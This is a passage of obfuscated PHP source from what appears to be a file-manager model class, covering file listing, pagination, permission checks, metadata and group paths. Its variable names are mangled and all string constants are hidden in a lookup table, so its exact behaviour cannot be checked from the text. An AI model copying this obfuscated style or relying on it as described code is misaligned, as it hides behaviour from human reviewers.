array_merge($¼ÖøğÈ¼[$¢Œ£²üŸ[86]], $Éôìáãğ); if (isset($¼ÖøğÈ¼[$¢Œ£²üŸ[444]]) && count($ëƒ¦ÖÂ) == $¼ÖøğÈ¼[$¢Œ£²üŸ[444]][$¢Œ£²üŸ[445]]) { return $¼ÖøğÈ¼; } $Íï¨Ïƒ„ = array(); $×²œÒ›¢ = array_to_keyvalue($¼ÖøğÈ¼[$¢Œ£²üŸ[85]], $¢Œ£²üŸ[12], $¢Œ£²üŸ[193]); $¡¹àŠÌ = array_to_keyvalue($¼ÖøğÈ¼[$¢Œ£²üŸ[86]], $¢Œ£²üŸ[12], $¢Œ£²üŸ[193]); $ö…µå„˜ = array_merge($¡¹àŠÌ, $×²œÒ›¢); foreach ($ëƒ¦ÖÂ as $µœé¯Å) { if (!in_array($µœé¯Å, $ö…µå„˜)) { $Íï¨Ïƒ„[] = $µœé¯Å; } } if ($Íï¨Ïƒ„) { Model($¢Œ£²üŸ[504])->removeBySource($Íï¨Ïƒ„); } return $¼ÖøğÈ¼; } public function listUserRecycle() { $È‰œåïŸ =& $_SERVER[°‰†òö¯]; $¤ˆ¯·ºÍ = Model($È‰œåïŸ[505])->listData(); if (!$¤ˆ¯·ºÍ) { return array(); } $¢Ì²´Š† = array($È‰œåïŸ[493] => array($È‰œåïŸ[494], $¤ˆ¯·ºÍ), $È‰œåïŸ[506] => 1); return $this->listSource($¢Ì²´Š†); } public function listSource($Á¯ÌÂú, $÷¯Ìç’ = 3000, $°Åøè = false) { $†Òöè©ê =& $_SERVER[°‰†òö¯]; if (!isset($Á¯ÌÂú[$†Òöè©ê[507]])) { $Á¯ÌÂú[$†Òöè©ê[507]] = 0; } if (isset($Á¯ÌÂú[$†Òöè©ê[192]]) && $Á¯ÌÂú[$†Òöè©ê[192]] == $†Òöè©ê[230]) { $Á¯ÌÂú[$†Òöè©ê[488]] = array($†Òöè©ê[508], $†Òöè©ê[12]); } $†˜İ¹¦í = $†Òöè©ê[509]; $ú¦ºßæ« = $this->field($†˜İ¹¦í)->_makeOrder()->where($Á¯ÌÂú)->selectPage($÷¯Ìç’); $this->_listPageCheck($ú¦ºßæ«, $†˜İ¹¦í, $Á¯ÌÂú); $this->_listDataApply($ú¦ºßæ«[$†Òöè©ê[447]], $°Åøè); $this->_listMake($ú¦ºßæ«); return $ú¦ºßæ«; } private function _listPageCheck(&$ùõ×ÁÆ¸, $É½Œşõ, $­Ôë£¢Ï) { $¾Òà°¤¶ =& $_SERVER[°‰†òö¯]; if (!is_array($ùõ×ÁÆ¸[$¾Òà°¤¶[444]])) { return; } $µ¢ŞÇğè = $ùõ×ÁÆ¸[$¾Òà°¤¶[444]]; if ($µ¢ŞÇğè[$¾Òà°¤¶[446]] <= 1) { return; } if ($µ¢ŞÇğè[$¾Òà°¤¶[445]] >= 100000) { return; } if (Model($¾Òà°¤¶[510])->get($¾Òà°¤¶[511]) != $¾Òà°¤¶[512]) { return; } $É½Œşõ = str_replace(array($¾Òà°¤¶[53], $¾Òà°¤¶[419], $¾Òà°¤¶[287]), $¾Òà°¤¶[12], $É½Œşõ); $É½Œşõ = $¾Òà°¤¶[513] . str_replace($¾Òà°¤¶[50], $¾Òà°¤¶[514], $É½Œşõ) . $¾Òà°¤¶[515]; $ÅŒèö—» = $¾Òà°¤¶[516]; $ÅŒèö—» = $ÅŒèö—» . $¾Òà°¤¶[517]; $ûË½¦üç = $µ¢ŞÇğè[$¾Òà°¤¶[441]] * ($µ¢ŞÇğè[$¾Òà°¤¶[430]] - 1) . $¾Òà°¤¶[50] . $µ¢ŞÇğè[$¾Òà°¤¶[441]]; $Öéí·‰Œ = $this->_makeOrder(!0); $®¤Ä¡Çã = $¾Òà°¤¶[513] . str_replace($¾Òà°¤¶[50], $¾Òà°¤¶[514], $Öéí·‰Œ[0]); if (strpos($®¤Ä¡Çã, $¾Òà°¤¶[518])) { $®¤Ä¡Çã = str_replace($¾Òà°¤¶[518], $¾Òà°¤¶[519], $®¤Ä¡Çã); } else { $®¤Ä¡Çã .= $¾Òà°¤¶[520] . $Öéí·‰Œ[1]; } $İÜ½ìÑ = array(); foreach ($­Ôë£¢Ï as $¤Ø÷—­Í => $Ù¯Ú¦÷‰) { $İÜ½ìÑ[$¾Òà°¤¶[513] . $¤Ø÷—­Í] = $Ù¯Ú¦÷‰; } $this->alias($¾Òà°¤¶[521])->field($É½Œşõ)->limit($ûË½¦üç)->order($®¤Ä¡Çã); $†¹¯‰õŞ = $this->join($ÅŒèö—»)->where($İÜ½ìÑ)->select(); if ($†¹¯‰õŞ) { $ùõ×ÁÆ¸[$¾Òà°¤¶[447]] = $†¹¯‰õŞ; } } protected function _makeOrder($©×™ÆşÉ = false) { $ñíŞëíú =& $_SERVER[°‰†òö¯]; $ªßª¤Äº = Model($ñíŞëíú[522])->get($ñíŞëíú[523]); $ï¯ù”ª = Model($ñíŞëíú[522])->get($ñíŞëíú[524]); $Æ„‘üœ  = array($ñíŞëíú[525] => $ñíŞëíú[526], $ñíŞëíú[527] => $ñíŞëíú[528]); $¸çäÑ¡ú = array($ñíŞëíú[32] => $ñíŞëíú[32], $ñíŞëíú[79] => $ñíŞëíú[79], $ñíŞëíú[169] => $ñíŞëíú[488], $ñíŞëíú[529] => $ñíŞëíú[529], $ñíŞëíú[530] => $ñíŞëíú[531], $ñíŞëíú[233] => $ñíŞëíú[233], $ñíŞëíú[88] => $ñíŞëíú[88]); $Îµ¢ÙÙá = Input::get($ñíŞëíú[532], $ñíŞëíú[7], $ªßª¤Äº, array_keys($¸çäÑ¡ú)); $êÍÏûÆ = Input::get($ñíŞëíú[533], $ñíŞëíú[7], $ï¯ù”ª, array_keys($Æ„‘üœ )); if (!in_array($Îµ¢ÙÙá, array_keys($¸çäÑ¡ú))) { $Îµ¢ÙÙá = $ñíŞëíú[32]; } if (!in_array($êÍÏûÆ, array_keys($Æ„‘üœ ))) { $Îµ¢ÙÙá = $ñíŞëíú[525]; } if ($Îµ¢ÙÙá == $ñíŞëíú[32]) { } $à…áÊ€ = $ñíŞëíú[534] . $¸çäÑ¡ú[$Îµ¢ÙÙá] . $ñíŞëíú[53] . $Æ„‘üœ [$êÍÏûÆ]; $à…áÊ€ = rtrim(trim($à…áÊ€), $ñíŞëíú[50]); if ($©×™ÆşÉ) { return array($à…áÊ€, $Æ„‘üœ [$êÍÏûÆ]); } return $this->order($à…áÊ€); } protected function _listDataApplyItem($Ó½ÅÇ¦, $Ñ–Áğ‹³ = false) { $¶õÛ‚²Ï = array($Ó½ÅÇ¦); $this->_listDataApply($¶õÛ‚²Ï, $Ñ–Áğ‹³); return $¶õÛ‚²Ï[0]; } protected function _listDataApply(&$Ãº—¨©ë, $íëÂ»åÓ = false) { $½ú¡åò” =& $_SERVER[°‰†òö¯]; if (!$Ãº—¨©ë) { $Ãº—¨©ë = array(); return; } $°äµ…û³ = array_to_keyvalue($Ãº—¨©ë, $½ú¡åò”[12], $½ú¡åò”[193]); $°äµ…û³ = array_unique($°äµ…û³); $this->_listSourceCache($Ãº—¨©ë); if (!$íëÂ»åÓ) { $this->_listAppendMeta($Ãº—¨©ë, $°äµ…û³); $this->_listAppendFileMeta($Ãº—¨©ë, $°äµ…û³); $this->_listAppendChildren($Ãº—¨©ë, $°äµ…û³); } $this->_listAppendPath($Ãº—¨©ë); $this->_listAppendAuth($Ãº—¨©ë); $this->_listAppendSourceInfo($Ãº—¨©ë, $°äµ…û³); $this->_listAppendUser($Ãº—¨©ë); $this->_listFilterInfo($Ãº—¨©ë, $íëÂ»åÓ); $this->_listAppendAuthSecret($Ãº—¨©ë); } protected function _listSourceCache($ÑÀ÷†§) { $ÒÃ×ºÉÑ =& $_SERVER[°‰†òö¯]; foreach ($ÑÀ÷†§ as $È½ÛÛÕ‹) { self::$cacheSourceInfo[$ÒÃ×ºÉÑ[535] . $È½ÛÛÕ‹[$ÒÃ×ºÉÑ[193]]] = $È½ÛÛÕ‹; } } protected function _listFilterInfo(&$Ô¾˜·×ü, $§™¸‡§Ï = false) { $·ŞİÂ– =& $_SERVER[°‰†òö¯]; foreach ($Ô¾˜·×ü as &$Æ½’¬ûß) { $Æ½’¬ûß = $this->pathInfoFilter($Æ½’¬ûß); self::$cachePathInfo[$·ŞİÂ–[536] . intval($§™¸‡§Ï) . $·ŞİÂ–[464] . $Æ½’¬ûß[$·ŞİÂ–[193]]] = $Æ½’¬ûß; } unset($Æ½’¬ûß); } protected function _listMake(&$¶ÌÊßá) { $Ş€š¡öø =& $_SERVER[°‰†òö¯]; $¶ÌÊßá[$Ş€š¡öø[85]] = array(); $¶ÌÊßá[$Ş€š¡öø[86]] = array(); foreach ($¶ÌÊßá[$Ş€š¡öø[447]] as $÷«‡Ê“Ô) { $ÙøëİÊ = $÷«‡Ê“Ô[$Ş€š¡öø[487]] == 1 ? $Ş€š¡öø[85] : $Ş€š¡öø[86]; $¶ÌÊßá[$ÙøëİÊ][] = $÷«‡Ê“Ô; } unset($¶ÌÊßá[$Ş€š¡öø[447]]); } protected function _listAppendMeta(&$©ÆªİÆ‘, $¢¡Õå²í) { $Ù‡½…ƒâ =& $_SERVER[°‰†òö¯]; $¾ÉØ©À¼ = array($Ù‡½…ƒâ[493] => array($Ù‡½…ƒâ[494], $¢¡Õå²í)); $²ğÄ­úç = Model($Ù‡½…ƒâ[537])->field($Ù‡½…ƒâ[538])->where($¾ÉØ©À¼)->select(); if (!$²ğÄ­úç) { return; } $á•½¤ªÑ = array($Ù‡½…ƒâ[539], $Ù‡½…ƒâ[540], $Ù‡½…ƒâ[519]); $Ö‹´¶Ôó = array(); foreach ($²ğÄ­úç as $¤å¯Øü·) { if (!isset($Ö‹´¶Ôó[$¤å¯Øü·[$Ù‡½…ƒâ[193]]])) { $Ö‹´¶Ôó[$¤å¯Øü·[$Ù‡½…ƒâ[193]]] = array(); } if (in_array($¤å¯Øü·[$Ù‡½…ƒâ[97]], $á•½¤ªÑ)) { continue; } if ($¤å¯Øü·[$Ù‡½…ƒâ[97]] == $Ù‡½…ƒâ[541]) { $¤å¯Øü·[$Ù‡½…ƒâ[452]] = $Ù‡½…ƒâ[542]; } $Ö‹´¶Ôó[$¤å¯Øü·[$Ù‡½…ƒâ[193]]][$¤å¯Øü·[$Ù‡½…ƒâ[97]]] = $¤å¯Øü·[$Ù‡½…ƒâ[452]]; } foreach ($©ÆªİÆ‘ as &$Ï­‚²Ó) { $Ï­‚²Ó[$Ù‡½…ƒâ[543]] = !1; if (isset($Ö‹´¶Ôó[$Ï­‚²Ó[$Ù‡½…ƒâ[193]]])) { $Ï­‚²Ó[$Ù‡½…ƒâ[543]] = $Ö‹´¶Ôó[$Ï­‚²Ó[$Ù‡½…ƒâ[193]]]; } if ($this->fileIsLock($Ï­‚²Ó) && $Ï­‚²Ó[$Ù‡½…ƒâ[489]]) { $èİ¾¢ï = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Ï­‚²Ó[$Ù‡½…ƒâ[489]][$Ù‡½…ƒâ[490]] = AuthModel::authDisable($Ï­‚²Ó[$Ù‡½…ƒâ[489]][$Ù‡½…ƒâ[490]], $èİ¾¢ï); $Ï­‚²Ó[$Ù‡½…ƒâ[489]][$Ù‡½…ƒâ[544]][$Ù‡½…ƒâ[489]] = $Ï­‚²Ó[$Ù‡½…ƒâ[489]][$Ù‡½…ƒâ[490]]; } } unset($Ï­‚²Ó); } protected function _listAppendFileMeta(&$¬êî¨â‚, $øÍŸöƒğ) { $º»èßñÉ =& $_SERVER[°‰†òö¯]; $ ·œéñï = array_to_keyvalue($¬êî¨â‚, $º»èßñÉ[12], $º»èßñÉ[545]); $ ·œéñï = array_filter(array_unique($ ·œéñï)); if (!$ ·œéñï) { return; } $ØˆğĞüó = array($º»èßñÉ[546] => array($º»èßñÉ[494], $ ·œéñï)); $ØÎ½±ô· = $º»èßñÉ[547]; $¶ó–°ô¸ = Model($º»èßñÉ[548])->field($ØÎ½±ô·)->where($ØˆğĞüó)->select(); $¶ó–°ô¸ = array_to_keyvalue($¶ó–°ô¸, $º»èßñÉ[545]); $ÃÁ•èî = Model($º»èßñÉ[549])->field($º»èßñÉ[550])->where($ØˆğĞüó)->select(); $ÃÁ•èî = $ÃÁ•èî ? $ÃÁ•èî : array(); $¶Õá¦› = array(); foreach ($ÃÁ•èî as $çŞƒïÃâ) { if (!isset($¶Õá¦›[$çŞƒïÃâ[$º»èßñÉ[545]]])) { $¶Õá¦›[$çŞƒïÃâ[$º»èßñÉ[545]]] = array(); } $¶Õá¦›[$çŞƒïÃâ[$º»èßñÉ[545]]][$çŞƒïÃâ[$º»èßñÉ[97]]] = $çŞƒïÃâ[$º»èßñÉ[452]]; } foreach ($¬êî¨â‚ as &$ÌÎµÍ™) { $µò•á¡½ = $ÌÎµÍ™[$º»èßñÉ[545]]; if (!$µò•á¡½ || !is_array($¶ó–°ô¸[$µò•á¡½])) { continue; } $¾²¯››ã = $¶ó–°ô¸[$µò•á¡½]; $¾²¯››ã[$º»èßñÉ[79]] = $ÌÎµÍ™[$º»èßñÉ[79]]; $¾²¯››ã[$º»èßñÉ[32]] = $ÌÎµÍ™[$º»èßñÉ[32]]; if (!$¾²¯››ã[$º»èßñÉ[551]]) { Model($º»èßñÉ[548])->fileMd5Check($¾²¯››ã); } if (!isset(self::$cacheFileInfo[$º»èßñÉ[552] . $µò•á¡½])) { self::$cacheFileInfo[$º»èßñÉ[552] . $µò•á¡½] = array_merge(array(), $¾²¯››ã); } unset($¶ó–°ô¸[$µò•á¡½][$º»èßñÉ[87]]); $øœÎ‚ä¾ = isset($¶Õá¦›[$µò•á¡½]) && is_array($¶Õá¦›[$µò•á¡½]) ? $¶Õá¦›[$µò•á¡½] : array(); $ÌÎµÍ™[$º»èßñÉ[170]] = array_merge($øœÎ‚ä¾, $¶ó–°ô¸[$µò•á¡½]); if (isset($ÌÎµÍ™[$º»èßñÉ[170]][$º»èßñÉ[184]])) { $ÌÎµÍ™[$º»èßñÉ[184]] = json_decode($ÌÎµÍ™[$º»èßñÉ[170]][$º»èßñÉ[184]], !0); unset($ÌÎµÍ™[$º»èßñÉ[170]][$º»èßñÉ[184]]); } } unset($ÌÎµÍ™); } protected function _listAppendSourceInfo(&$Ï¹½±Ğ‰, $‹£¹ºÀô) { $äŠĞ•ã =& $_SERVER[°‰†òö¯]; $÷ÍºŞ®‰ = Model($äŠĞ•ã[553])->listData(); $Ñ¯¾Í‡Œ = Model($äŠĞ•ã[501])->listData(); $şğ¤îÚ£ = Model($äŠĞ•ã[491])->listData(); $Ì¾ïÀ•– = Model($äŠĞ•ã[554])->listSimple(); $¡‡ãš™È = array_to_keyvalue($÷ÍºŞ®‰, $äŠĞ•ã[477]); $”ïØ²³• = array_to_keyvalue_group($Ñ¯¾Í‡Œ, $äŠĞ•ã[87], $äŠĞ•ã[502]); $ßâ‹Ì—î = array_to_keyvalue($şğ¤îÚ£, $äŠĞ•ã[87]); $¹…šÏËƒ = array_to_keyvalue_group($Ì¾ïÀ•–, $äŠĞ•ã[193]); foreach ($Ï¹½±Ğ‰ as &$¢‘øÈ±µ) { $¢‘øÈ±µ[$äŠĞ•ã[90]] = array($äŠĞ•ã[555] => 0, $äŠĞ•ã[556] => 0, $äŠĞ•ã[557] => 0); if (isset($ßâ‹Ì—î[$¢‘øÈ±µ[$äŠĞ•ã[193]]])) { $¢‘øÈ±µ[$äŠĞ•ã[90]][$äŠĞ•ã[558]] = 1; $¢‘øÈ±µ[$äŠĞ•ã[90]][$äŠĞ•ã[559]] = $ßâ‹Ì—î[$¢‘øÈ±µ[$äŠĞ•ã[193]]][$äŠĞ•ã[32]]; } if ($”ïØ²³• && $¡‡ãš™È && isset($”ïØ²³•[$¢‘øÈ±µ[$äŠĞ•ã[193]]])) { $¢‘øÈ±µ[$äŠĞ•ã[90]][$äŠĞ•ã[560]] = array(); foreach ($”ïØ²³•[$¢‘øÈ±µ[$äŠĞ•ã[193]]] as $İ‡êº¯Æ) { $²ÔÒÅ‰î = $¡‡ãš™È[$İ‡êº¯Æ]; $¢‘øÈ±µ[$äŠĞ•ã[90]][$äŠĞ•ã[560]][] = array($äŠĞ•ã[561] => $²ÔÒÅ‰î[$äŠĞ•ã[477]], $äŠĞ•ã[496] => $²ÔÒÅ‰î[$äŠĞ•ã[32]], $äŠĞ•ã[562] => $²ÔÒÅ‰î[$äŠĞ•ã[563]]); } } if ($¹…šÏËƒ && isset($¹…šÏËƒ[$¢‘øÈ±µ[$äŠĞ•ã[193]]])) { $¢‘øÈ±µ[$äŠĞ•ã[90]][$äŠĞ•ã[564]] = array(); foreach ($¹…šÏËƒ[$¢‘øÈ±µ[$äŠĞ•ã[193]]] as $­•—‘ı™) { $Ğ¦ŸÀ²Ì = $äŠĞ•ã[565]; if ($­•—‘ı™[$äŠĞ•ã[566]] == $äŠĞ•ã[91]) { $Ğ¦ŸÀ²Ì .= $äŠĞ•ã[567]; } $¢‘øÈ±µ[$äŠĞ•ã[90]][$äŠĞ•ã[564]] = array_field_key($­•—‘ı™, explode($äŠĞ•ã[50], $Ğ¦ŸÀ²Ì)); } } } unset($¢‘øÈ±µ); return $Ï¹½±Ğ‰; } protected function _listAppendChildren(&$åü›äº, $Âå§›êö) { $å¤Û¾« =& $_SERVER[°‰†òö¯]; $•ÇèªÈ‘ = array(); $£Î›äéô = array($å¤Û¾«[241] => 0, $å¤Û¾«[242] => 0); foreach ($åü›äº as &$šîàÖí±) { if (!$šîàÖí±[$å¤Û¾«[487]]) { continue; } $•ÇèªÈ‘[] = $šîàÖí±[$å¤Û¾«[193]]; } unset($šîàÖí±); if (!$•ÇèªÈ‘) { return; } $°Øš†´ = array($å¤Û¾«[192] => array($å¤Û¾«[7], $•ÇèªÈ‘), $å¤Û¾«[507] => 0); $äÒÆ­Ã° = array($å¤Û¾«[192], $å¤Û¾«[487], $å¤Û¾«[568] => $å¤Û¾«[569]); $Âı¡Ù‰ı = $this->field($äÒÆ­Ã°)->where($°Øš†´)->group($å¤Û¾«[570])->select(); $äŞ¡€›Ø = array(); foreach ($Âı¡Ù‰ı as $ğ”ãã¸–) { $ø¼èšüÀ = $ğ”ãã¸–[$å¤Û¾«[192]]; $¨Ñ¹½¤İ = $ğ”ãã¸–[$å¤Û¾«[487]] == $å¤Û¾«[91] ? $å¤Û¾«[242] : $å¤Û¾«[241]; if (!isset($äŞ¡€›Ø[$ø¼èšüÀ])) { $äŞ¡€›Ø[$ø¼èšüÀ] = array($å¤Û¾«[241] => 0, $å¤Û¾«[242] => 0); } $äŞ¡€›Ø[$ø¼èšüÀ][$¨Ñ¹½¤İ] += $ğ”ãã¸–[$å¤Û¾«[569]]; } foreach ($åü›äº as &$šîàÖí±) { if (!$šîàÖí±[$å¤Û¾«[487]]) { continue; } $µèèú¢ù = is_array($äŞ¡€›Ø[$šîàÖí±[$å¤Û¾«[193]]]) ? $äŞ¡€›Ø[$šîàÖí±[$å¤Û¾«[193]]] : $£Î›äéô; $šîàÖí±[$å¤Û¾«[242]] = $µèèú¢ù[$å¤Û¾«[242]]; $šîàÖí±[$å¤Û¾«[241]] = $µèèú¢ù[$å¤Û¾«[241]]; unset($šîàÖí±[$å¤Û¾«[488]]); } unset($šîàÖí±); } protected function _listAppendAuth(&$ƒÆÂ”ïß) { $»íÚ¥›Ş =& $_SERVER[°‰†òö¯]; $Æ¿Û”åÔ = array(); foreach ($ƒÆÂ”ïß as $½ş§Ş—) { if ($½ş§Ş—[$»íÚ¥›Ş[190]] == self::TYPE_GROUP) { $Æ¿Û”åÔ[] = $½ş§Ş—[$»íÚ¥›Ş[193]]; } } if (!$Æ¿Û”åÔ) { return; } $µş³ãö = array_to_keyvalue($ƒÆÂ”ïß, $»íÚ¥›Ş[193]); $ı’„×ŠÏ = Model($»íÚ¥›Ş[571])->getSourceList($Æ¿Û”åÔ, $µş³ãö); $İ¾ï±áÏ = KodUser::isRoot(); foreach ($ƒÆÂ”ïß as $¡â®åî => &$½ş§Ş—) { $½ş§Ş—[$»íÚ¥›Ş[489]] = $ı’„×ŠÏ[$½ş§Ş—[$»íÚ¥›Ş[193]]]; if (!$½ş§Ş—[$»íÚ¥›Ş[489]] && $½ş§Ş—[$»íÚ¥›Ş[190]] == self::TYPE_GROUP) { $½ş§Ş—[$»íÚ¥›Ş[489]] = Action($»íÚ¥›Ş[572])->pathGroupAuthMake($½ş§Ş—[$»íÚ¥›Ş[573]]); if (!$½ş§Ş—[$»íÚ¥›Ş[489]] && !$İ¾ï±áÏ) { $½ş§Ş—[$»íÚ¥›Ş[235]] = !1; $½ş§Ş—[$»íÚ¥›Ş[234]] = !1; } } if ($½ş§Ş—[$»íÚ¥›Ş[489]]) { $½ş§Ş—[$»íÚ¥›Ş[235]] = AuthModel::authCheckEdit($½ş§Ş—[$»íÚ¥›Ş[489]][$»íÚ¥›Ş[490]]); $½ş§Ş—[$»íÚ¥›Ş[234]] = AuthModel::authCheckView($½ş§Ş—[$»íÚ¥›Ş[489]][$»íÚ¥›Ş[490]]); } $this->groupPathDisplay($½ş§Ş—); } unset($½ş§Ş—); } public function _listAppendAuthSecret(&$È§¤Ä£›) { $İ•³Á®¾ =& $_SERVER[°‰†òö¯]; if (Model($İ•³Á®¾[510])->get($İ•³Á®¾[574]) != $İ•³Á®¾[91]) { return; } static $”ûú­—Ù = false; if (!$”ûú­—Ù) { $ğ½Åâ°‹ = Model($İ•³Á®¾[575]); $É“õê• = Model($İ•³Á®¾[576]); $”ûú­—Ù = $É“õê•->listData(); $”ûú­—Ù = array_to_keyvalue($”ûú­—Ù, $İ•³Á®¾[193]); $ËÏÔ¿‚‡ = json_decode(Model($İ•³Á®¾[510])->get($İ•³Á®¾[577]), !0); $ËÏÔ¿‚‡ = array_to_keyvalue($ËÏÔ¿‚‡, $İ•³Á®¾[477]); foreach ($”ûú­—Ù as $êË×Øü => $…—ëÈ×Ü) { $İù”Ğ‰ = $ËÏÔ¿‚‡[$…—ëÈ×Ü[$İ•³Á®¾[578]]]; if (!$İù”Ğ‰) { $É“õê•->remove($…—ëÈ×Ü[$İ•³Á®¾[477]]); unset($”ûú­—Ù[$êË×Øü]); continue; } $Ûşú®ıŒ = $ğ½Åâ°‹->listData($İù”Ğ‰[$İ•³Á®¾[489]]); if (!$Ûşú®ıŒ) { $É“õê•->remove($…—ëÈ×Ü[$İ•³Á®¾[477]]); unset($”ûú­—Ù[$êË×Øü]); continue; } $…—ëÈ×Ü[$İ•³Á®¾[489]] = $Ûşú®ıŒ; $…—ëÈ×Ü[$İ•³Á®¾[579]] = $İù”Ğ‰; $…—ëÈ×Ü[$İ•³Á®¾[580]] = Model($İ•³Á®¾[581])->getInfoSimpleOuter($…—ëÈ×Ü[$İ•³Á®¾[529]]); $”ûú­—Ù[$êË×Øü] = $…—ëÈ×Ü; } } $¦¹½’ßê = USER_ID; $±¹Ê‰ÙØ = array(); $Ñô›œã… = $this->_listAppendPath($±¹Ê‰ÙØ, !0); foreach ($È§¤Ä£› as $êË×Øü => &$…—ëÈ×Ü) { if (!is_array($…—ëÈ×Ü[$İ•³Á®¾[489]])) { continue; } if ($…—ëÈ×Ü[$İ•³Á®¾[190]] != $İ•³Á®¾[582]) { continue; } if (isset($”ûú­—Ù[$…—ëÈ×Ü[$İ•³Á®¾[193]]])) { $ôÆªŞ’ü = $”ûú­—Ù[$…—ëÈ×Ü[$İ•³Á®¾[193]]]; if (!is_array($…—ëÈ×Ü[$İ•³Á®¾[543]])) { $…—ëÈ×Ü[$İ•³Á®¾[543]] = array(); } $…—ëÈ×Ü[$İ•³Á®¾[543]][$İ•³Á®¾[583]] = $ôÆªŞ’ü[$İ•³Á®¾[578]]; $…—ëÈ×Ü[$İ•³Á®¾[489]][$İ•³Á®¾[584]] = $ôÆªŞ’ü; $…—ëÈ×Ü[$İ•³Á®¾[489]][$İ•³Á®¾[585]] = $…—ëÈ×Ü[$İ•³Á®¾[586]]; $…—ëÈ×Ü[$İ•³Á®¾[489]][$İ•³Á®¾[587]] = $İ•³Á®¾[91]; if ($ôÆªŞ’ü[$İ•³Á®¾[529]] != $¦¹½’ßê) { $…—ëÈ×Ü[$İ•³Á®¾[489]][$İ•³Á®¾[490]] = $…—ëÈ×Ü[$İ•³Á®¾[489]][$İ•³Á®¾[490]] & $ôÆªŞ’ü[$İ•³Á®¾[489]][$İ•³Á®¾[489]]; } continue; } $ÄªµĞõ = $this->parentLevelArray($…—ëÈ×Ü[$İ•³Á®¾[588]]); $¶¿ÈÒÑ¬ = array_reverse($ÄªµĞõ); foreach ($¶¿ÈÒÑ¬ as $¦ôê¾²Ò => $™œ–¡¥é) { if (!isset($”ûú­—Ù[$™œ–¡¥é])) { continue; } $ôÆªŞ’ü = $”ûú­—Ù[$™œ–¡¥é]; $…—ëÈ×Ü[$İ•³Á®¾[489]][$İ•³Á®¾[584]] = $ôÆªŞ’ü; if ($ôÆªŞ’ü[$İ•³Á®¾[529]] != $¦¹½’ßê) { $…—ëÈ×Ü[$İ•³Á®¾[489]][$İ•³Á®¾[490]] = $…—ëÈ×Ü[$İ•³Á®¾[489]][$İ•³Á®¾[490]] & $ôÆªŞ’ü[$İ•³Á®¾[489]][$İ•³Á®¾[489]]; } $­éË¿‘ = $İ•³Á®¾[12]; $“„©¢•è = count($ÄªµĞõ) - $¦ôê¾²Ò; for ($š¶âãõ¡ = 0; $š¶âãõ¡ < $“„©¢•è; $š¶âãõ¡++) { if (!isset($Ñô›œã…[$ÄªµĞõ[$š¶âãõ¡]])) { $­éË¿‘ = $İ•³Á®¾[12]; break; } $­éË¿‘ = $­éË¿‘ . rtrim($Ñô›œã…[$ÄªµĞõ[$š¶âãõ¡]], $İ•³Á®¾[8]) . $İ•³Á®¾[8]; } $…—ëÈ×Ü[$İ•³Á®¾[489]][$İ•³Á®¾[585]] = rtrim($­éË¿‘, $İ•³Á®¾[8]) . $İ•³Á®¾[8]; break; } } unset($…—ëÈ×Ü); } public function groupPathDisplay(&$ÈóÏÕÖƒ) { $ÇƒŠ±ĞÃ =& $_SERVER[°‰†òö¯]; if ($ÈóÏÕÖƒ[$ÇƒŠ±ĞÃ[190]] != self::TYPE_GROUP) { return; } $ùÌ½Ş¥ò = Model($ÇƒŠ±ĞÃ[589])->getInfo($ÈóÏÕÖƒ[$ÇƒŠ±ĞÃ[573]]); $ğ¤Âåèğ = $this->parentLevelArray($ùÌ½Ş¥ò[$ÇƒŠ±ĞÃ[588]]); $ôÑÜå¸Ü = $ÇƒŠ±ĞÃ[12]; foreach ($ğ¤Âåèğ as $è¬»Î•º) { $Ô¨™–şÎ = Model($ÇƒŠ±ĞÃ[589])->getInfo($è¬»Î•º); $ôÑÜå¸Ü .= $Ô¨™–şÎ[$ÇƒŠ±ĞÃ[90]][$ÇƒŠ±ĞÃ[193]] . $ÇƒŠ±ĞÃ[50]; } $ÈóÏÕÖƒ[$ÇƒŠ±ĞÃ[590]] = $ùÌ½Ş¥ò[$ÇƒŠ±ĞÃ[192]]; $ÈóÏÕÖƒ[$ÇƒŠ±ĞÃ[591]] = $ùÌ½Ş¥ò[$ÇƒŠ±ĞÃ[588]]; $ÈóÏÕÖƒ[$ÇƒŠ±ĞÃ[592]] = $ùÌ½Ş¥ò[$ÇƒŠ±ĞÃ[593]]; $ÈóÏÕÖƒ[$ÇƒŠ±ĞÃ[594]] = $ôÑÜå¸Ü . $ùÌ½Ş¥ò[$ÇƒŠ±ĞÃ[90]][$ÇƒŠ±ĞÃ[193]]; } protected function _listAppendPath(&$Ÿ•îÜš¨, $¤ Â‚Ûø = false) { $òâë©ÓŠ =& $_SERVER[°‰†òö¯]; static $†òıŠû  = array(); $¹·‹‘²í = array(); $ñÕ§ß = array(); if ($¤ Â‚Ûø) { return $†òıŠû ; } foreach ($Ÿ•îÜš¨ as &$Ğ„˜èÇù) { $†¥Ï™Æ± = $Ğ„˜èÇù[$òâë©ÓŠ[193]]; if ($Ğ„˜èÇù[$òâë©ÓŠ[487]] == $òâë©ÓŠ[91] && $Ğ„˜èÇù[$òâë©ÓŠ[192]] != 0) { $†òıŠû [$†¥Ï™Æ±] = $Ğ„˜èÇù[$òâë©ÓŠ[32]]; } if ($Ğ„˜èÇù[$òâë©ÓŠ[487]] == $òâë©ÓŠ[91] && $Ğ„˜èÇù[$òâë©ÓŠ[192]] == 0) { $†òıŠû [$†¥Ï™Æ±] = $this->_listAppendPathRoot($Ğ„˜èÇù, array()); } if (isset($ñÕ§ß[$Ğ„˜èÇù[$òâë©ÓŠ[588]]])) { continue; } $ñÕ§ß[$Ğ„˜èÇù[$òâë©ÓŠ[588]]] = !0; $‡Á¡Í‰ = $this->parentLevelArray($Ğ„˜èÇù[$òâë©ÓŠ[588]]); foreach ($‡Á¡Í‰ as $œüÙÇÜƒ => $Ì†û£™Š) { if (isset($†òıŠû [$Ì†û£™Š])) { continue; } if ($œüÙÇÜƒ == 0) { $†òıŠû [$Ì†û£™Š] = $this->_listAppendPathRoot($Ğ„˜èÇù, $‡Á¡Í‰); } if ($œüÙÇÜƒ != 0) { $¹·‹‘²í[] = $Ì†û£™Š; } } } unset($Ğ„˜èÇù); $¹·‹‘²í = array_unique($¹·‹‘²í); if (count($¹·‹‘²í) > 0) { $±ãĞ©Ù = array($òâë©ÓŠ[493] => array($òâë©ÓŠ[494], $¹·‹‘²í)); if (count($¹·‹‘²í) == 1) { $Á¢é÷‘¬ = $this->sourceInfo($¹·‹‘²í[0]); $‹Ö¿ºŸæ = is_array($Á¢é÷‘¬) ? array($Á¢é÷‘¬) : !1; } else { $‹Ö¿ºŸæ = $this->field($òâë©ÓŠ[595])->where($±ãĞ©Ù)->select(); } if (!$‹Ö¿ºŸæ) { 